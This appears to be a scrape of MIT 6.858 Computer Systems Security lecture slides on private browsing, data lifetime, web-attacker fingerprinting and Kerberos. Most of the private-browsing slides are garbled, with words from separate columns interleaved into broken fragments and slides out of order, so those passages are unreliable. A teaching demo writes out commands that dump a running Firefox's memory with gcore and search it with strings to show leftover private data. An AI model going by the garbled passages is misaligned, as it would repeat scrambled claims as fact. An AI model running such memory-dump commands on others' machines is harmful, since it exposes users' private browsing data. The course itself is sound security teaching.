	&#13; 	&#13; to	&#13; 1,	&#13; 2,	&#13; and	&#13; 
To	&#13; fi
upon	&#13; session	&#13; termination.	&#13; Hx	&#13; this,	&#13; private	&#13; browsing	&#13; mode	&#13; 
owever,	&#13; wo
thuld
is	&#13; i	&#13; ne
s	&#13; tre
id
c	&#13; to
ky,	&#13; be	&#13; flushion
	&#13; th	&#13; 
erecords!
	&#13; DNS	&#13; cac	&#13; 
cache	&#13; typically	&#13; requires	&#13; admin	&#13; rights	&#13; on	&#13; your	&#13; machine	&#13; (do	&#13; you	&#13; want	&#13; cause	&#13; flushing 	&#13; h
the
e	&#13; 
	&#13; 
 browser	&#13; having	&#13; admin	&#13; rights?)	&#13; generated	&#13; by	&#13; a	&#13; particular	&#13; user.	&#13; and	&#13; deletes	&#13; all	&#13; DNS 	&#13; state,	&#13; not	&#13; the 	&#13; state	&#13; the	&#13; 
	&#13; 
DemDuring	&#13; private	&#13; browsing,	&#13; objects	&#13; in	&#13; RAM	&#13; 
o	&#13; can	&#13; also	&#13; get	&#13; paged	&#13; out	&#13; to	&#13; disk!	&#13; 
 
 OpeVisitn	&#13; F
	&#13; http://pdos.csail.mit.edu/irefox	&#13; in	&#13; Private	&#13; Browsing	&#13; Mo
	&#13; de	&#13; 
	&#13; 
sudo gcore $(pgrep firefox) 
strings core.* | grep -i pdos 
//-e l: Look for string using the //      character encoding 16-bit 
//      little-endian. 
//-a:   Scan all of the file. //-t:   Print the offset within 
//      the file.
	&#13; 
Data	&#13; lifetime	&#13; is	&#13; a	&#13; broader	&#13; problem	&#13; than	&#13; just	&#13;  
 
 private	&#13; brows
	&#13; Ref:	&#13; Ex:	&#13; cryptographic	&#13; keys	&#13; or	&#13; passwords	&#13; might	&#13; be	&#13; problematic	&#13; if	&#13; disclosed.	&#13; ing!	&#13; 
Demo	&#13; http://css.csail.mit.edu/6.858/2010/readings/chow-shredding.pdf 	&#13; 
cat memclear.c 
cat secret.txt 
make memclear 
./memclear &amp; sudo gcore $(pgrep memclear) 
strings core.* | grep secret
	&#13; 
Wh
ere	&#13; does	&#13; data	&#13; persist? 	&#13;  
 Process	&#13; memory:	&#13; heap,	&#13; stack.	&#13; 
o 
o Terminal	&#13; scrollback	&#13; I/O	&#13; buffers,	&#13; X	&#13; event	&#13; queues,	&#13; DNS	&#13; cache,	&#13; proxy	&#13; servers,	&#13; ... 	&#13; 
2
2</text>
        </slide>
        <slide>
          <slideno>5</slideno>
          <text>How
abo
 ut	&#13; wh	&#13; do	&#13; w
o	&#13; inite	&#13; cat
iaeg
torize	&#13; 
ed	&#13; the	&#13; stthose	&#13; 
ate	&#13; chatypes
nge	&#13; (Sect	&#13; of	&#13; state?
ion	&#13; 2.1).	&#13; The	&#13; paper	&#13; says	&#13; that	&#13; we	&#13; should	&#13; think	&#13; 
Initiated
o
 Stays	&#13; within	&#13; session,	&#13; is	&#13; deleted	&#13; on	&#13; by	&#13; web	&#13; site,	&#13; no	&#13; user	&#13; interaction:
	&#13; 	&#13; 
session	&#13; cookies,	&#13; hist	&#13; 
teardowory,	&#13; cache.
n.	&#13; 	&#13; 
Initiated
pass
owor 
 d	&#13; by	&#13; web	&#13; s
s.	&#13; ite,	&#13; requires	&#13; user 	&#13; interaction:	&#13; client	&#13; certificates,	&#13; saved 	&#13; 
Uncl
persisear	&#13; w
tently,	&#13; prhat's	&#13; t
obably	&#13; becaushe	&#13; best	&#13; strategy;
e	&#13; the	&#13; br
	&#13; usowsers	&#13; tend	&#13; to	&#13; store	&#13; this	&#13; state
 action.	&#13; er	&#13; has	&#13; to	&#13; explicitly	&#13; authorize 	&#13; 	&#13; 
the	&#13; 
Initiated	&#13; by	&#13; user:	&#13; bookmarks,	&#13; file	&#13; 
o Same	&#13; as	&#13; above:	&#13; browsers	&#13; downloads.	&#13; 
o us
but	&#13; noer	&#13; authorizes	&#13; the	&#13; actiontend	&#13; 
	&#13; to	&#13; store	&#13; this	&#13; state	&#13; persistently 	&#13; because	&#13; the	&#13; 
employed	&#13; private	&#13; browsing	&#13; mode!	&#13; 
 te	&#13; that	&#13; storing	&#13; this	&#13; state	&#13; may	&#13; reveal	&#13; the	&#13; fact	&#13; that	&#13; the	&#13; user	&#13; 
Ex:	&#13; In	&#13; Firefox	&#13; and	&#13; Chrome,	&#13; bookmarks	&#13; live	&#13; in	&#13; a	&#13; SQLite	&#13; database.	&#13; 
 values	&#13; for	&#13; metadata	&#13; Bookmarks	&#13; generated	&#13; in	&#13; private	&#13; browsing	&#13; mode	&#13; will	&#13; have	&#13; empty	&#13; 
 Ref:	&#13; http://homepages.cs.ncllike	&#13; "last_visit_count".	&#13; 
Unrel
o at
Treaed	&#13; to	&#13; a	&#13; session:	&#13; Brow
t	&#13; as	&#13; a	&#13; single	&#13; global	&#13; sser	&#13; updat
tate	&#13; shared	&#13; between	&#13; public	&#13; mode	&#13; andes,	&#13; cert.ac.uk/feng.hao/files/D
ificate	&#13; revocation	&#13; list	&#13; updatPM13.pdf
es.	&#13; 	&#13; 
mode.	&#13; 	&#13; private	&#13; 
	&#13; 
What	&#13; do	&#13; browsers	&#13; actually	&#13; implement?	&#13; 
 
 Each	&#13; brMoreover,	&#13; some	&#13; state	&#13; "bleeds	&#13; over"	&#13; in	&#13; oneowser	&#13; is,	&#13; of	&#13; course,	&#13; different.	&#13; 
a	&#13; strict	&#13; partitioning	&#13; between	&#13;  private	&#13; mode	&#13; and	&#13; public	&#13; mode	&#13; state.	&#13; 	&#13; direction	&#13; but	&#13; not	&#13; another!	&#13; There	&#13; isn't	&#13; 
  	&#13; 
Q:A:	&#13; Easier	&#13; for	&#13; web	&#13; attacker	&#13; to	&#13; link	&#13; private	&#13; 	&#13; Wh
o at	&#13; happens	&#13; if	&#13; public	&#13; state	&#13; bleeds	&#13; ove
session	&#13; r	&#13; into	&#13; priva
to	&#13; put
be	&#13; state?	&#13; 
Ex:	&#13; A	&#13; client-side	&#13; lic	&#13; session. 	&#13; 
 	&#13; the	&#13; user	&#13; in	&#13; privatSSL	&#13; 
e	&#13; mode.	&#13; certificate	&#13; that's	&#13; installed	&#13; in	&#13; public	&#13; mode	&#13; can	&#13; identify	&#13; 
 Q:
A:	&#13; This	&#13; helps	&#13; both	&#13; a	&#13; web	&#13; attacker	&#13; and	&#13; a	&#13; 	&#13; What	&#13; happens	&#13; if	&#13; private	&#13; state	&#13; bleeds 	&#13; over	&#13; into	&#13; pub
public	&#13; session	&#13; will	&#13; reveal	&#13; information	&#13; aboloc
ut	&#13; pral	&#13; attac
ivateke
	&#13; srl
:ic	&#13; st
e	&#13; obsa
et
re?
ssionsv
	&#13; !ing	&#13; s	&#13; 
	&#13; tate	&#13; from	&#13; a	&#13; 
  
 Q:
A:	&#13; Most	&#13; browsers	&#13; allow	&#13; state	&#13; to	&#13; persist	&#13; within	&#13; a	&#13; private	&#13; mode	&#13; session	&#13; (see	&#13; 	&#13; What	&#13; should	&#13; happen	&#13; to	&#13; sta te	&#13; while	&#13; user 	&#13; remains	&#13; in	&#13; a	&#13; private	&#13; mode	&#13; session?	&#13; 
Tab
ole	&#13; 3).
 A	&#13; "no"	&#13; entry	&#13; means	&#13; that	&#13; a	&#13; web	&#13; attacker	&#13; might	&#13; be	&#13; able	&#13; to	&#13; detect	&#13; 	&#13; 
private	&#13; 
	&#13; 
 mode	&#13; browsing!	&#13; 
Q:	&#13; Why	&#13; is	&#13; it	&#13; OK	&#13; to	&#13; allow	&#13; cookies 	&#13; in	&#13; private	&#13; browsing	&#13; mode?	&#13; 
6
6</text>
        </slide>
        <slide>
          <slideno>7</slideno>
          <text>The	&#13; b
solutug	&#13; was	&#13; "deprioritized	&#13; when	&#13; it 	&#13; became	&#13; clear	&#13; that	&#13; the	&#13; potential	&#13; 
responion
se,	&#13; [was]	&#13; more	&#13; involved	&#13; than	&#13; original	&#13; 
	&#13; a	&#13; developer 	&#13; said	&#13; "That	&#13; is	&#13; very	&#13; sad	&#13; anti
to	&#13; heacipate
pretty	&#13; much	&#13; defeat	&#13; the	&#13; purpose	&#13; of	&#13; r.	&#13; Thisd";	&#13; i
	&#13; n	&#13; 
can	&#13; 
 Off-
oth
 e-shelf	&#13; forensics	&#13; forgetting
tool	&#13; abo
s	&#13; caut	&#13; clo
n	&#13; find	&#13; sed
evidence	&#13; private	&#13; windth
oings
ws,	&#13; e	&#13; suc
tc."h
	&#13; 	&#13; as	&#13; sessionstore	&#13; 
Ex:	&#13; Magnet's
 Ref:	&#13; http://www.magnetforensics.com	&#13; Internet	&#13; Evidence	&#13; Finder 	&#13; 	&#13; of	&#13; private	&#13; browser	&#13; sessions.	&#13; 
 http://www.magnetforensics.com/how-explorers -inprivate-browsing -first-define/how
does-pr-
ivate/	&#13; private
	&#13; -is-internet-
o This	&#13; t
 oolmode-
	&#13; finds	&#13; privaaffect-digital -forensics/ 	&#13; -chromes-incognito-
During	&#13; a	&#13; private	&#13; session	&#13; a
te	&#13; se ssion,	&#13; rt
IEifa
	&#13; stct
oress	&#13; for	&#13; IE,	&#13; Chrome,	&#13; and	&#13; Firefox.	&#13; 
ob
spaject
ce	&#13; is	&#13; not	&#13; wiped,	&#13; so	&#13; private	&#13; data	&#13; remainss	&#13; are	&#13; deleted	&#13; upon	&#13; private	&#13; session	&#13; 	&#13; objects	&#13; in	&#13; the	&#13; file	&#13; system.	&#13; Those	&#13; 
close,	&#13; but
l	&#13; the	&#13; 
 space.	&#13; 	&#13; in	&#13; una locast
ted	&#13; diskorage	&#13; 
	&#13; 
Cprhrome	&#13; and	&#13; Firefox	&#13; use	&#13; in-memory	&#13; 
Howivate
ever,	&#13; brSQLite	&#13; databases	&#13; during	&#13; 
	&#13; 	&#13; o
liws
ke	&#13; all	&#13; bring,	&#13; so	&#13; t
owshey	&#13; l
ersea
,	&#13; thve	&#13; few
ey	&#13; leaver
e	&#13; artifacts	&#13; in	&#13; the	&#13; file	&#13; system.	&#13; 
	&#13; artifacts	&#13; in	&#13; the	&#13; page	&#13; file. 	&#13; 
8
8</text>
        </slide>
        <slide>
          <slideno>3</slideno>
          <text>Easo 
o 
 Link	&#13; visits	&#13; by	&#13; the	&#13; same	&#13; user	&#13; from	&#13; Link	&#13; visits	&#13; by	&#13; user	&#13; from	&#13; private	&#13; browsing	&#13; different	&#13; private	&#13; browsing	&#13; sessions.	&#13; 
y	&#13; way	&#13; to	&#13; id
o With	&#13; reentif
asonabley	&#13; user
	&#13; pr:	&#13; IP	&#13; ad
obabid
lir
tyes
,	&#13; rs.
e	&#13; and	&#13; public	&#13; browsing	&#13; sessions. 	&#13; 
o same	&#13; user.	&#13; quests 	&#13; from	&#13; the	&#13; same	&#13; IP	&#13; address	&#13; are	&#13; the	&#13; 
Nex
TCP	&#13; connectt	&#13; lecture,	&#13; 
ion	&#13; (i.e.,	&#13; user's	&#13; IP).we'll	&#13; discuss	&#13; Tor.	&#13; Tor
How	&#13; pr
ever,otects
 challenges	&#13; with	&#13; implementing	&#13; private	&#13; 	&#13; 
bro	&#13; Tor	&#13; 	&#13; the	&#13; pr
doesnivacy	&#13; of
't	&#13; solve	&#13; 	&#13; the	&#13; s
otour
	&#13; ce	&#13; of 	&#13; a	&#13; 
wsiher
Browser	&#13; finunique	&#13; Even	&#13; if	&#13; the	&#13; user	&#13; employs	&#13; Tor,	&#13; a	&#13; web	&#13; server
Open	&#13; Cgerprinyzing	&#13; t
	&#13; characteristics	&#13; of	&#13; her	&#13; browser	&#13; runtime!	&#13; can	&#13; still	&#13; identng.	&#13; 
ting	&#13; demo.	&#13; 	&#13; ify	&#13; her	&#13; by	&#13; anal he	&#13; 
 
 hrome,	&#13; go	&#13; to	&#13; http://panopticlick.eff.org/	&#13; 
	&#13; 
 Open	&#13; the	&#13; same	&#13; web	&#13; site	&#13; in	&#13; private	&#13; browsing	&#13; mode.	&#13; 
 Good	&#13; w
the	&#13; largest	&#13; set	&#13; of	&#13; users	&#13; among	&#13; which	&#13; some	&#13; ay	&#13; to	&#13; think	&#13; of	&#13; privacy:	&#13; what	&#13; is	&#13; the 	&#13; anonymity	&#13; set	&#13; of	&#13; a	&#13; user?	&#13; I.e.,	&#13; what	&#13; is	&#13; 
Panopticlick	&#13; shows	&#13; that	&#13; this	&#13; set	&#13; is 	&#13; small	&#13; for	&#13; most	&#13; users,	&#13; because	&#13; users	&#13; user	&#13; is	&#13; indistinguishable?	&#13; 
have	&#13; unique	&#13; local	&#13; settings	&#13; for	&#13; fonts,	&#13; plugins,	&#13; etc.	&#13; tend	&#13; to	&#13; 
	&#13; 
 How	&#13; can	&#13; a	&#13; web	&#13; attacker	&#13; determine	&#13; if	&#13; you're	&#13; 
o Paper	&#13; describ
 es	&#13; a	&#13; history	&#13; sniffing	&#13; attackusing	&#13; pr
	&#13; basedivate	&#13; br
	&#13; on	&#13; link	&#13; cow
osing	&#13; mode?	&#13; 
Attacker	&#13; page	&#13; loads	&#13; a	&#13; URL	&#13; in	&#13; an	&#13; iframe,	&#13; then	&#13; createlo
srs.	&#13; 
 stURL	&#13; and
ore	&#13; hist	&#13; sees	&#13; 
ory).w
	&#13; hether	&#13; the	&#13; link	&#13; is	&#13; purple 	&#13; (private	&#13; sessions	&#13; don't	&#13; a	&#13; link	&#13; to	&#13; th
	&#13; at	&#13; 
This	&#13; attack	&#13; doesn't	&#13; work	&#13; any	&#13; more,	&#13; 
o ex
attacks	&#13; from	&#13; a	&#13; pose	&#13; link 	&#13; color	&#13; to	&#13; JavaScript!	&#13; [See	&#13; discussionsince	&#13; browsers	&#13; no	&#13; longer	&#13; 
However,	&#13; there	&#13; may	&#13; be	&#13; other	&#13; ways	&#13; for	&#13; the	&#13; few	&#13; lectures	&#13; ago.]	&#13; 	&#13; of	&#13; history	&#13; sniffing	&#13; 
using	&#13; pr
 ivate	&#13; mode.	&#13; attacker	&#13; to	&#13; tell	&#13; that	&#13; you're	&#13; 
Ex:
So,	&#13; if	&#13; you	&#13; visit	&#13; Public-mode	&#13; cookies	&#13; cannot	&#13; be	&#13; 
	&#13; a	&#13; page	&#13; in	&#13; public	&#13; mode,	&#13; and	&#13; then	&#13; in	&#13; private	&#13; mode,	&#13; the	&#13; seen 	&#13; by	&#13; private -mode	&#13; pages.	&#13; 
	&#13; page	&#13; can	&#13; detect	&#13; that 	&#13; an	&#13; expected	&#13; cookie	&#13; is	&#13; missing.	&#13; 
How
addr	&#13; 
eca
ssn
	&#13; pr	&#13; w
ie	&#13; 
vacy	&#13; fprovide	&#13; 
or	&#13; nost
w,ron
	&#13; org
	&#13; assume	&#13; that	&#13; users	&#13; employ	&#13; Tor.]	&#13; er	&#13; guarantees	&#13; for	&#13; private	&#13; browsing?	&#13; [Let's	&#13; ignore	&#13; IP	&#13; 
	&#13; 
 Approach	&#13; 1:	&#13; VM
Plan:	&#13; 
Run	&#13; each	&#13; pr-level	&#13; privacy 	&#13; 
o 
 
 
 Ensure	&#13; that	&#13; the	&#13; Vivate	&#13; br
Somehow	&#13; make	&#13; sure	&#13; that	&#13; no	&#13; VM	&#13; isowsing	&#13; session	&#13; in	&#13; a
	&#13; deleted	&#13; after	&#13; private	&#13; br	&#13; separa
owste	&#13; VM
ing	&#13; is.	&#13; 
M	&#13; state	&#13; ends	&#13; up	&#13; on	&#13; disk	&#13; [d	&#13; done.
	&#13; 
 paging?	&#13; isable	&#13; 	&#13; 
oSecure	&#13; deallocation?].	&#13; 
Advantages:	&#13; 	&#13; 
4
4</text>
        </slide>
        <slide>
          <slideno>4</slideno>
          <text>StrNo	&#13; ong	&#13; guarantees	&#13; against	&#13; both	&#13; a	&#13; local
just	&#13; need	&#13; secur	&#13; attacker 	&#13; a	&#13; we
.cha
	&#13; nges	&#13; required	&#13; to	&#13; appl	&#13; and
VMication, 	&#13;  e	&#13; deletion	&#13; of	&#13; b	&#13; attacker. 	&#13; 
	&#13; 
o Dra
w
 
 ba
Poor	&#13; Spinning	&#13; up	&#13; a	&#13; separcks:	&#13; 
usability:	&#13; It'sate	&#13; V
browsing,	&#13; use	&#13; bookmarks,	&#13; etc.	&#13; 	&#13; harderM	&#13; for
	&#13; for	&#13; us	&#13; pr
erivate
s	&#13; to	&#13; save	&#13; files	&#13; from	&#13; private	&#13; 	&#13; browsing	&#13; is	&#13; heavyweight. 	&#13; 
	&#13; 
	&#13; o 
 Approach	&#13; 2:	&#13; OSInherent	&#13; tr
Plan:	&#13; Implement	&#13; similar	&#13; guarantees	&#13; at	&#13; the	&#13; OS	&#13; 
A	&#13; process	&#13; can	&#13; run	&#13; in	&#13; a	&#13; "privacy	&#13; domain",	&#13; -level	&#13; privacyade-off	&#13; between	&#13; usa
	&#13; bility	&#13; and 	&#13; privacy! 	&#13; 
o 
	&#13;  kernel	&#13; level. 	&#13; 
o afterwards. 	&#13; which	&#13; will	&#13; be	&#13; deleted	&#13; 
	&#13; 
o Advantages	&#13; over	&#13; VM:	&#13; Lighter-weight.	&#13; 
Dra
lot	&#13; ow
f	&#13; sb
tateacks	&#13; 
.	&#13; w.r.t	&#13; VM:	&#13; Harder	&#13; to	&#13; get	&#13; right, 	&#13; since	&#13; the	&#13; OS	&#13; kernel	&#13; manages	&#13; a	&#13; 
	&#13; Are	&#13; there	&#13; ways	&#13; to	&#13; de-anonymize	&#13; a	&#13; user	&#13; who	&#13; employs	&#13; 
 Maybe	&#13; the	&#13; VM 	&#13; itself	&#13; is	&#13; unique!	&#13; So,	&#13; we	&#13; need 	&#13; to	&#13; ensure	&#13; that	&#13; all	&#13; users	&#13; have	&#13; similar	&#13; these	&#13; approaches? 	&#13; 
VMs.
o	&#13; 
 
 Maybe	&#13; the	&#13; V
o This	&#13; limits	&#13; the	&#13; extent	&#13; to	&#13; which	&#13; users	&#13; can	&#13; customize	&#13; V
oEx:MM	&#13; or	&#13; host	&#13; computer	&#13; introduces	&#13; some	&#13; Ms.	&#13; 
	&#13; TCP	&#13; fingerprinting:	&#13; The	&#13; TCP	&#13; protocol 	&#13; allows	&#13; some	&#13; parameters	&#13; touniqueness.	&#13; 
 set
Tools	&#13; like	&#13; nmap	&#13; send	&#13; carefully	&#13; crafted	&#13; packets	&#13; to	&#13; a	&#13; remote	&#13; server;	&#13; can	&#13; 	&#13; by	&#13; th e	&#13; implementation	&#13; (e.g.,	&#13; the	&#13; initial	&#13; packet	&#13; size,	&#13; the	&#13; initial	&#13; TTL).	&#13; be
	&#13; 	&#13; 
 The	&#13; user	&#13; is	&#13; st
o guess 	&#13; the	&#13; remote	&#13; OS	&#13; with	&#13; high	&#13; likelihood!	&#13; 
o Detectil
	&#13; the	&#13; user's	&#13; keystroke	&#13; timing.	&#13; l	&#13; shared!	&#13; So,	&#13; perhaps	&#13; the	&#13; attacker	&#13; can:	&#13; 
o Det
Ref:	&#13; http://33bits.orect	&#13; the	&#13; user's	&#13; writ
g/2012/02/20/ising	&#13; style.	&#13; This 	&#13; is	&#13; called	&#13; stylography. 	&#13; 
	&#13; deanonymize-material-posted -online/-
	&#13; writing-style-sufficient -to-
Why	&#13; do	&#13; browsers	&#13; implement	&#13; their	&#13; own	&#13; private	&#13; 
 Main	&#13; reason	&#13; is	&#13; deployability:	&#13; Users	&#13; don't	&#13; have	&#13; to	&#13; run	&#13; their	&#13; browser	&#13; in	&#13; a	&#13; custom	&#13; browsing	&#13; support? 	&#13; 
VM	&#13; 
oor	&#13; O
 
 Similar	&#13; motivation	&#13; for	&#13; Native	&#13; CS.	&#13; 
Another	&#13; reason	&#13; is	&#13; usability:	&#13; Some	&#13; types	&#13; oflient.	&#13; 
shou
ol
 d	&#13; 
This	&#13; is	&#13; abe	&#13; able	&#13; to
	&#13; da	&#13; pe
ngerous	&#13; plrsist	&#13; after	&#13; the	&#13; session	&#13; i	&#13; state	&#13; generated	&#13; in	&#13; private	&#13; mode	&#13; 
s	&#13; finished. 	&#13; [ex:	&#13; downloaded	&#13; files]. 	&#13; 
it
of	&#13; st's	&#13; difficu
ate	&#13; (bl
utt	&#13; t
	&#13; noto	&#13; find	&#13; 
	&#13; others)	&#13; tcleaa
n	&#13; n!	&#13; B
curow
ts	&#13; in	&#13; sers	&#13; a
the	&#13; architecture	&#13; which	&#13; allow	&#13; some	&#13; typesre	&#13; complicated	&#13; pieces	&#13; of	&#13; software,	&#13; so	&#13; 
o	&#13; persist. 	&#13; 	&#13; 
5
5</text>
        </slide>
        <slide>
          <slideno>2</slideno>
          <text>*Language	&#13; runtime	&#13; makes	&#13; copies	&#13; (e.g.,	&#13; immutable	&#13; strings	&#13; in	&#13; Python)	&#13; 
 Swap	&#13; file,	&#13; hibero
 es, 
 
 
Fil 	&#13; file	&#13; backups
nate	&#13; file,	&#13; SQLite
	&#13; 	&#13; databases	&#13; 
Kernel	&#13; memory:	&#13; 
o 
o 
o IO	&#13; buffers:	&#13; keyboard,	&#13; mouse	&#13; inputs	&#13; 
o Freed	&#13; memory	&#13; pages	&#13; 
o *Network	&#13; packet	&#13; buf
*Random	&#13; number	&#13; generator	&#13; inputs	&#13; *Pipe	&#13; buffers	&#13; contain	&#13; dfer
ata	&#13; ss	&#13; 
ent	&#13; betwe
(inclen	&#13; pr
uding	&#13; kocess
eystes	&#13; 
	&#13; rokes	&#13; again).	&#13; 
How
 Files	&#13; themselves	&#13; may	&#13; contain	&#13; multiple	&#13; 	&#13; could	&#13; an	&#13; attacker	&#13; get	&#13; a	&#13; copy	&#13; of	&#13; leftover
versions	&#13; (e.g.,	&#13; W	&#13; data?	&#13; 
 feature).	&#13; ord	&#13; used	&#13; to	&#13; support	&#13; this	&#13; 
Programs	&#13; may	&#13; leak	&#13; information	&#13; if	&#13; they	&#13; don't	&#13; scrub	&#13; memory	&#13; on	&#13; deallocation	&#13; or	&#13; 
progr
o am
Ex:	&#13; shu
	&#13; In	&#13; oldtdown:	&#13; 
o toEx:	&#13; If	&#13; the	&#13; kernel/V	&#13; disk 	&#13; wher
e	&#13; L
n	&#13; a	&#13; neinux	&#13; 
w	&#13; dkernels,	&#13; up	&#13; to
MM	&#13; doesn't	&#13; wipe	&#13; memory	&#13; pages,	&#13; then	&#13; information	&#13; irectory	&#13; was	&#13; 4
	&#13; c	&#13; KB	&#13; o
reatef	&#13; kernel	&#13; memory	&#13; could	&#13; be	&#13; leaked	&#13; 
d.	&#13; 
 
 from	&#13; process	&#13; X	&#13; can	&#13; leak
 DirectCore	&#13; dumps	&#13; 	&#13; into	&#13; process	&#13; Y	&#13; that	&#13; uses	&#13; X's 	&#13; old	&#13; memory	&#13; pages.	&#13; 
Flash	&#13; SSDs	&#13; implement	&#13; logging---	&#13; access 	&#13; to	&#13; the	&#13; machine	&#13; 
Stolen	&#13; disks,	&#13; or
H	&#13;  
ow	&#13; can	&#13; we	&#13; deal	&#13; with	&#13; the	&#13; data	&#13; lifetime	&#13; problems?	&#13; o http://news	&#13; just	&#13; disposing	&#13; of	&#13; oldthey
Ref:	&#13;  .cnet.com/2100-	&#13; disk	&#13; don'
s	&#13; t	&#13; erase	&#13; old	&#13; data	&#13; right	&#13; away! 	&#13; 
1040-980824.html	&#13; 
 
 Zero	&#13; out	&#13; unused	&#13; memory	&#13; [with	&#13; some	&#13; performance	&#13; Encr
oypt	&#13; d
 ata	&#13; in	&#13; places	&#13; where	&#13; zeroing	&#13; out	&#13; is 	&#13; difficultdegra
	&#13; (e.g.,	&#13; da
on	&#13; tion].
o Securely	&#13; deleting	&#13; the	&#13; key	&#13; means	&#13; data	&#13; cannot	&#13; be	&#13; decrypted	&#13; anymore!an	&#13; SSD).	&#13; 
	&#13; 
o at	&#13; boEx:	&#13; OpenBSD
ot	&#13; time.	&#13; 	&#13; swap	&#13; uses	&#13; encryption,	&#13; with	&#13; a	&#13; new	&#13; encryption	&#13; key	&#13; gener	&#13; 
ated	&#13; 
	&#13; 
Threat	&#13; 2:	&#13; Web	&#13; attacCPU	&#13; cost	&#13; of	&#13; encryption	&#13; is	&#13; modest	&#13; compared	&#13; to	&#13; disk	&#13; I/O.	&#13; 
ker	&#13; 
 Assumptions:	&#13; 
o 
o 
o Attacker	&#13; controls	&#13; the	&#13; web	&#13; sites	&#13; that	&#13; 
Attacker	&#13; does	&#13; not	&#13; control	&#13; the	&#13; user's	&#13; machine.	&#13; the	&#13; user	&#13; visits. 	&#13; 
 Secur
o ity	&#13; goals:Attacker	&#13; wants	&#13; to	&#13; detect	&#13; when	&#13; the	&#13; 
	&#13; user	&#13; visits	&#13; the	&#13; site.	&#13; 
	&#13; o Attacker	&#13; cannot	&#13; identify	&#13; the	&#13; user.	&#13; 
Attacker	&#13; cannot	&#13; determine	&#13; if	&#13; the	&#13; user	&#13; is	&#13; employing	&#13; private	&#13; browsing	&#13; 
mode.	&#13; 
Defen
 ding	&#13; against	&#13; a	&#13; web	&#13; attacker	&#13; is	&#13; very 	&#13; difficult!	&#13; 
What	&#13; does	&#13; it	&#13; mean	&#13; to	&#13; identify	&#13; a	&#13; user?	&#13; 
3
3</text>
        </slide>
      </slides>
      <videos>
        <video>
          <video_url>https://ocw.mit.edu/courses/6-858-computer-systems-security-fall-2014/resources/lecture-12-network-security/</video_url>
          <video_title>Lecture 12: Network Security</video_title>
          <transcript/>
        </video>
      </videos>
    </lecture>
    <lecture>
      <lecture_title>iSEC Partners</lecture_title>
      <lecture_pdf_url>https://ocw.mit.edu/https://www.isecpartners.com/</lecture_pdf_url>
      <lectureno>5</lectureno>
      <slides/>
      <videos>
        <video>
          <video_url>https://ocw.mit.edu/courses/6-858-computer-systems-security-fall-2014/resources/lecture-13-network-protocols/</video_url>
          <video_title>Lecture 13: Network Protocols</video_title>
          <transcript/>
        </video>
      </videos>
    </lecture>
    <lecture>
      <lecture_title>Network Protocols (PDF)</lecture_title>
      <lecture_pdf_url>https://ocw.mit.edu/courses/6-858-computer-systems-security-fall-2014/resources/mit6_858f14_lec13/</lecture_pdf_url>
      <lectureno>13</lectureno>
      <slides>
        <slide>
          <slideno>7</slideno>
          <text>MIT OpenCourseWare
http://ocw.mit.edu
6.858 Computer Systems Security
Fall 2014
For information about citing these materials or our Terms of Use, visit: http://ocw.mit.edu/terms.</text>
        </slide>
        <slide>
          <slideno>4</slideno>
          <text>No Kerberos	&#13; protocol involved	&#13; when	&#13; accessing	&#13; local files,	&#13; processes.
	 If logging in using Kerberos, user must have presented legitimate ticket.
	 What if user logs in using username/password (locally or via SSH using pw)?
o	 User knows whether the password he/she supplied is legitimate.
o
	 Server has no idea.

	 Potential attack on a server:
o	 User connects	&#13; via SSH, types	&#13; in usern ame,	&#13; password.
o
	 Create	&#13; legitimate-looking	&#13; Kerberos response,	&#13; encrypted with password.
o
	 Server has no way to tell if this response is really legitimate.

	 Solution (if server keeps state): server needs its own principal,	&#13; key.
o	 First obtain user's	&#13; TGS, using the	&#13;  user's username and password.
o	 Then use TGS to	&#13; obtain	&#13; a ticket for server's principal.
o If user faked the Kerberos server, the second ticket will not match.
Using
Kerberos	&#13; in an application.
	 Paper suggests using special functions to seal messages, 3 security	&#13; levels.
	 Requires moderate changes to an application.
o	 Good for flexibility, performance.
o
	 Bad for ease of adoption.
o
	 Hard	&#13; for developers	&#13; to	&#13; understand	&#13; subtle	&#13; security	&#13; guarantees.

 Perhaps a better	&#13; abstraction:	&#13; secure channel (SSL/TLS).
Password -
changing	&#13;  service (administrative interface).
	 How does the	&#13; Kerberos	&#13; protocol ensure	&#13; that client knows	&#13; password? Why?
o Special flag in ticket indicates which interface	&#13; was used to obtain it.
o Password - changing	&#13; service only	&#13; accepts	&#13; tickets	&#13; obtained	&#13; by	&#13; using K_c.
o Ensure th at	&#13; client	&#13; knows old password,	&#13; doesn't	&#13; just	&#13; have the ticket.
	 How does the	&#13; client change	&#13; the	&#13; user's	&#13; password?
o Connect to	&#13; password-changing	&#13; service, send new password	&#13; to	&#13; server.
Replication.

	 One master server (supports password changes), zero or more slav es.
	 All servers can issue tickets, only master can change keys.
	 Why this split?
o Only one master ensures consistency: cannot have conflicting changes.

	 Master periodically updates the slaves (when	&#13; paper was written,	&#13; ~once/hour).
o	 More recent impls have incremental propagation:	&#13; lower	&#13; latency	&#13; (but not
0).

	 How scalable	&#13; is this?
o	 Symmetric crypto (DES, AES) is fast -- O(100MB/sec) on	&#13; current	&#13; 
hardware.
o	 Tickets are small, O(100 bytes), so can support 1M tickets/second.
o
	 Easy	&#13; to scale	&#13; by adding	&#13; slaves.

	 Potential problem: password changes take a while to propagate.
	 Adversary can still use a stolen password for a while after user changes it.
5</text>
        </slide>
        <slide>
          <slideno>5</slideno>
          <text>To learn more about how to do replication right, take 6.824.
Security	&#13; of the
Kerberos	&#13; database.
Master and slave servers are highly	&#13; sensitive	&#13; in this	&#13; design.
Compromised	&#13; master/slave server means all passwords/keys have to change.
Must	&#13; be physically secure,	&#13; no bugs in	&#13; Kerberos server software,
ono bugs in any other network service on server machines, etc.
Can
we	&#13; do better? SSL	&#13; C A	&#13; infrastructure slightly better, but not much.
oWill  look at  it in more  detail when we talk  about  browser  security  / 
HTTPS.
Most centralized
authentication systems suffer from such problems.
oglobally -unique	&#13; freeform names require some trusted mapping authority.
Why didn't	&#13; Kerberos use public key crypto?
Too slow at the time: VAX	&#13; systems, 10MHz	&#13; clocks.
Government export restrictions.
Patents.
Network
attacks.
Offline password guessing	&#13; attacks on	&#13; Kerberos server.
oKerberos v5 prevents clients from requesting ticket	&#13; for any principal.
oMust include { timestamp }_{K_c} along with request, proves know K_c.
oStill vulnerable to password guessing by network sniffer at that time.
oBetter alternatives are available: SRP, PAKE.
What	&#13; c
an	&#13; adversary do with a stolen	&#13; ticket?
What	&#13; can	&#13; adversary do with a stolen	&#13; K_c?
What	&#13; can	&#13; adversary do with a stolen	&#13; K_s?
oRemember: two parties share each key (and rely on it) in Kerberos!
